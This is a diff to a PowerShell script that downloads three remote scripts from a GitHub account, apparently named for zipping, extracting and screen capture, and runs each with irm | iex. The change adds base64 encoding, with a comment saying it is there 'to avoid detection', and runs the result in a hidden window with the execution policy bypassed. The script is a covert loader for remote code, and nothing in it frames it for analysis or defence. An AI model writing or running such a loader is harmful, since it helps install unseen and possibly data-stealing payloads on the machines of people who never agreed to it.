@@ -1,12 +1,19 @@
-# PowerShell Multi-Command Executor (Hidden Window)
+# Save this as a .ps1 file and run it
+$script = @'
 $commands = @(
-    'irm https://raw.githubusercontent.com/bunny1233/mynewscripts/main/zip2.txt | iex',
-    'irm https://raw.githubusercontent.com/bunny1233/mynewscripts/main/extract-1.txt | iex', 
-    'irm https://raw.githubusercontent.com/bunny1233/mynewscripts/main/screen.txt | iex'
+    {irm https://raw.githubusercontent.com/bunny1233/mynewscripts/main/zip2.txt | iex},
+    {irm https://raw.githubusercontent.com/bunny1233/mynewscripts/main/extract-1.txt | iex},
+    {irm https://raw.githubusercontent.com/bunny1233/mynewscripts/main/screen.txt | iex}
 )
 
-# Execute all commands silently
 foreach ($cmd in $commands) {
-    Invoke-Expression $cmd
-    Start-Sleep -Seconds 2  # Wait 2 seconds between commands
+    & $cmd
+    Start-Sleep -Seconds 2
 }
+'@
+
+# Encode script to base64 to avoid detection
+$encodedScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))
+
+# Execute silently
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encodedScript
